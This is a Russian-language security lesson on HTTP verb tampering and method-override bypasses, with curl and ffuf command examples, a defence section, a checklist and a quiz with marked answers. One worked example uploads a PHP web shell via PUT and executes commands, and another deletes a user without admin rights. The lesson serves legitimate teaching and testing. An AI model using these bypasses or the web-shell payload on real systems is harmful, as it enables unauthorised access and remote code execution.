---
id: web-http-verb-tampering
title: "HTTP method/verb tampering и method override"
category: web
parent: web-waf-evasion-basics
difficulty: medium
order: 1
tags: [http-method, verb-tampering, method-override, access-control, waf-bypass]
prerequisites: [web-http-basics, web-waf-bypass]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 40
summary: "Как смена HTTP-метода или заголовков override обходит аутентификацию, авторизацию и фильтры."
---

HTTP-метод (verb) — это не просто «GET или POST». В реальных приложениях доступ часто проверяется на уровне маршрутизации, middleware или даже фронтенда, и несоответствие между тем, какой метод ожидает защита и какой обрабатывает бэкенд, открывает обход аутентификации и авторизации. Этот урок — про method/verb tampering, `X-HTTP-Method-Override` и связанные обходы.

## Почему метод важен для безопасности

Опасность возникает из-за **расхождения представлений** о запросе. Фронтенд-роутер может считать, что `/admin` защищён (потому что «защищённый» метод — GET), а серверный обработчик отвечает и на POST, и на PUT. Или прокси проверяет авторизацию только для «опасных» методов. Или WAF блокирует `POST`, но пропускает `GET` с телом. В любом случае вы получаете доступ к функциональности, которая должна быть защищена.

Классический пример — **verb-based access control**: разработчик защитил `GET /admin` (роут), но не `HEAD /admin`, `POST /admin`, `TRACE /admin`. Или защита реализована как «если метод != GET — требуем токен», и `HEAD` проскакивает.

## Техника 1: смена метода

Простейший тест — повторить запрос с другим методом. Автоматизируйте перебор всех методов.

```bash
# перебрать методы для защищённого ресурса
for m in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X "$m" https://t/admin)
  echo "$m -> $code"
done
```

Типичные находки: `HEAD` отдаёт те же заголовки/данные без тела; `OPTIONS` раскрывает разрешённые методы; `TRACE` отражает запрос (XST); `PUT` позволяет загрузить файл.

## Техника 2: X-HTTP-Method-Override

Многие фреймворки (Spring, Express, Rails, ASP.NET) поддерживают «override»-заголовки, позволяющие клиенту, ограниченному GET/POST, эмулировать другие методы.

```bash
# эмулировать PUT/DELETE через POST + override
curl -s -X POST https://t/api/item/1 -H 'X-HTTP-Method-Override: DELETE'
curl -s -X POST https://t/api/item/1 -H 'X-HTTP-Method-Override: PUT' -d '{"admin":true}'

# варианты заголовка
-H 'X-HTTP-Method: DELETE'
-H 'X-Method-Override: DELETE'
-H 'X-HTTP-Method-Override: PATCH'
```

Если middleware проверяет метод **до** применения override, а роутер — **после**, вы обходите защиту: проверка видит «POST» (разрешён), а обработчик получает «DELETE».

## Техника 3: переопределение через параметр

Некоторые фреймворки читают метод из query или тела.

```bash
curl -s 'https://t/api/item/1?_method=DELETE'
curl -s 'https://t/api/item/1' -d '_method=DELETE'
curl -s 'https://t/api/item/1' -d 'method=PUT&admin=true'
```

В Laravel/Symfony это `_method`; в некоторых Go-фреймворках — `_method` или `method`. Проверяйте все варианты.

## Техника 4: регистр и пробелы в методе

HTTP-метод должен быть в верхнем регистре, но некоторые серверы принимают и иные формы, а WAF может их не распознавать.

```bash
curl -s -X 'get' https://t/admin          # некоторые серверы примут
curl -s -X 'Get' https://t/admin
curl -s -X 'GET ' https://t/admin          # trailing space
curl -s -X 'GET\t' https://t/admin
```

Расхождение между тем, что видит WAF (например, блокирует `GET /admin`), и тем, что понимает сервер (`get /admin` как GET), — классический обход.

## Техника 5: method confusion на уровне прокси

Reverse proxy и backend могут по-разному нормализовать метод. Например, nginx передаёт метод как есть, а backend маппит неизвестный метод в GET. Или наоборот. Это смежная область с request smuggling.

```bash
# неизвестный метод
curl -s -X 'FOO' https://t/admin
# метод с телом (GET с body)
curl -s -X GET https://t/admin -d 'admin=true'
```

## Разобранный пример: обход авторизации через HEAD

```bash
# 1. защищённый роут отвечает 401 на GET
$ curl -s -o /dev/null -w '%{http_code}\n' https://t/admin
401

# 2. но HEAD проходит
$ curl -sI https://t/admin | head -5
HTTP/1.1 200 OK
Content-Length: 4821
# -> middleware проверяет только GET

# 3. и OPTIONS раскрывает методы
$ curl -sI -X OPTIONS https://t/admin | grep -i allow
Allow: GET,HEAD,POST,PUT,DELETE

# 4. пробуем PUT для загрузки файла
$ curl -s -X PUT https://t/admin/shell.php --data-binary '<?php system($_GET["c"]); ?>'
$ curl -s 'https://t/admin/shell.php?c=id'
uid=33(www-data)
```

Артефакт — обход защиты (`200` там, где должен быть `401`) и, при удаче, RCE.

## Разобранный пример: override обходит проверку

```bash
# защита: middleware требует admin для DELETE
$ curl -s -X DELETE https://t/api/users/5 -H 'Cookie: session=user'
403 Forbidden

# обход: POST + override
$ curl -s -X POST https://t/api/users/5 -H 'X-HTTP-Method-Override: DELETE' -H 'Cookie: session=user'
{"deleted":5}
# -> пользователь удалён без прав admin
```

## Инструменты

```bash
# ffuf: перебор методов как "слов"
printf 'GET\nPOST\nPUT\nPATCH\nDELETE\nHEAD\nOPTIONS\nTRACE\n' > methods.txt
ffuf -w methods.txt -u https://t/admin -X FUZZ -mc all -fc 404 -fs 0
# nuclei: теги на method tampering/HTTP
nuclei -u https://t -tags http,misconfig -silent
```

## Крайние случаи и подводные камни

- **`HEAD` не всегда «как GET».** Некоторые фреймворки обрабатывают HEAD отдельно; проверяйте.
- **`OPTIONS` раскрывает методы** — это низкоуровневая находка, но полезная для карты.
- **`TRACE`** может быть включён (XST) — проверяйте, но это редкость.
- **CORS preflight** использует `OPTIONS` — не путайте с method tampering.
- **Кэш** может кэшировать `GET`, но не `POST` — меняя метод, можно обойти кэш.
- **Расхождение WAF/backend** по регистру метода — частый баг.

## Что делать дальше / решение

1. **Соберите карту методов** — `OPTIONS` и перебор всех verb'ов на защищённых ресурсах.
2. **Ищите расхождения** — 401/403 на одном методе и 200 на другом.
3. **Пробуйте override** — `X-HTTP-Method-Override`, `_method`, регистр.
4. **Проверьте тело у GET/HEAD** — иногда это меняет поведение.
5. **Доведите до артефакта** — доступ к защищённым данным или действию.
6. **Тупик** — переходите к request smuggling и HTTP/2-специфике.

## Справочная таблица

| Техника | Как отправить | Что ищем |
|---------|---------------|----------|
| смена метода | `-X PUT` | 200 вместо 401 |
| override | `X-HTTP-Method-Override` | доступ к чужому действию |
| параметр | `_method=DELETE` | обход роутинга |
| регистр | `-X 'get'` | расхождение WAF/сервер |
| GET с телом | `-X GET -d ...` | неожиданная обработка |
| OPTIONS | `-X OPTIONS` | список методов |
| TRACE | `-X TRACE` | отражение запроса (XST) |

## HTTP/2 и method tampering

В HTTP/2 метод передаётся в псевдозаголовке `:method`, и это добавляет новые расхождения. Прокси может нормализовать `:method` иначе, чем backend. Также в HTTP/2 нет метода `CONNECT` в привычном виде, а `OPTIONS` обрабатывается специфично. Проверяя method tampering, всегда сравнивайте поведение по HTTP/1.1 и HTTP/2.

```bash
# принудительно HTTP/2 prior knowledge
curl -s --http2-prior-knowledge -X PUT https://t/admin -o /dev/null -w '%{http_code}\n'
# и то же по HTTP/1.1
curl -s --http1.1 -X PUT https://t/admin -o /dev/null -w '%{http_code}\n'
# расхождение кодов = потенциальная десинхронизация/обход
```

Если `PUT` даёт `401` по HTTP/1.1, но `200` по HTTP/2, — вы нашли расхождение, которое может эксплуатироваться. Это смежная область с request smuggling и HTTP/2-спецификой.

## Практика: полный цикл тестирования

Системный подход к method tampering состоит из четырёх шагов. Первый — **инвентаризация**: соберите все защищённые и чувствительные эндпоинты (админки, API-действия, операции удаления/создания). Второй — **базовая проверка**: для каждого эндпоинта зафиксируйте, какой метод ожидается и какой код возвращается. Третий — **перебор**: прогоните все методы и override-заголовки, сравните коды и тела. Четвёртый — **доказательство**: если нашли расхождение, воспроизведите его минимальной командой и покажите, что получили доступ к данным или действию.

```bash
# инвентаризация + перебор одним скриптом
for path in /admin /api/users /api/config /api/orders; do
  echo "== $path"
  for m in GET POST PUT PATCH DELETE HEAD OPTIONS; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -X "$m" "https://t$path" -b 'session=user')
    echo "  $m -> $code"
  done
done
```

Аномалия — это не только `200`, но и `500` (сервер дошёл до обработчика, но упал на неожиданном методе), и `405` с другим телом, и `301`. Каждая аномалия — повод копнуть глубже.

## Защита и как она ломается

Правильная защита проверяет метод **в одном месте** — там же, где авторизация, и до бизнес-логики. Проблемы начинаются, когда проверок несколько и они не согласованы: WAF смотрит на `:method`, middleware — на заголовок после override, роутер — на нормализованный метод. Ещё одна ошибка — «черный список» методов вместо «белого»: разработчик блокирует `DELETE`, но забывает `HEAD`/`PATCH`. Белый список (разрешить только нужные методы) надёжнее, но и его обходят через override, если он применяется после проверки.

Отдельно проверьте, не полагается ли защита на фронтенд: если кнопка «Удалить» скрыта в UI, но API принимает `DELETE` — это не защита. И не путайте method tampering с IDOR: здесь мы обходим именно проверку метода, а не владения объектом.

## Чек-лист тестировщика

- [ ] Для каждого защищённого пути перебраны все методы.
- [ ] Проверены `X-HTTP-Method-Override` и его варианты.
- [ ] Проверены `_method`/`method` в query и теле.
- [ ] Проверен регистр метода (`get`, `Get`).
- [ ] Проверен `GET`/`HEAD` с телом.
- [ ] Проверены `OPTIONS`/`TRACE`.
- [ ] Сравнено поведение HTTP/1.1 и HTTP/2.
- [ ] Найденные расхождения подтверждены артефактом.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое verb tampering?"
  options:
    - "Обход контроля доступа/фильтров сменой HTTP-метода"
    - "Шифрование трафика"
    - "Отравление DNS"
    - "SQL-инъекция"
  answer: 0
  explanation: "Разные слои трактуют методы по-разному."
- question: "Какой заголовок переопределяет метод на уровне приложения?"
  options:
    - "`X-HTTP-Method-Override`"
    - "`Content-Type`"
    - "`Referer`"
    - "`Age`"
  answer: 0
  explanation: "Фреймворки часто поддерживают override-заголовки/параметр `_method`."
- question: "Почему `HEAD` может обойти правило для `GET`?"
  options:
    - "Контроль доступа может быть привязан только к `GET`"
    - "`HEAD` шифруется"
    - "`HEAD` не проходит через прокси"
    - "`HEAD` меняет cookie"
  answer: 0
  explanation: "Правило покрывает один метод, а `HEAD` — другой."
- question: "Какой заголовок может переписать путь на прокси/фреймворке?"
  options:
    - "`X-Original-URL`"
    - "`Content-Length`"
    - "`Server`"
    - "`Vary`"
  answer: 0
  explanation: "Некоторые стеки используют его для маршрутизации."
- question: "Что сделать, если `GET /admin` даёт 403?"
  options:
    - "Пробовать другие методы, регистр пути и override-заголовки"
    - "Сдаться"
    - "Сменить DNS"
    - "Отключить cookie"
  answer: 0
  explanation: "403 не финален — проверяйте варианты."
```

## Где пригодится

- **CTF (Web):** простые, но обманчивые задачи на 403-обход.
- **Bug bounty:** «403 → 200» через метод/заголовки — частая находка.
- **Пентест:** аудит контроля доступа на уровне метода/пути.
- **Работа (AppSec/Dev):** единообразная проверка авторизации для всех методов.
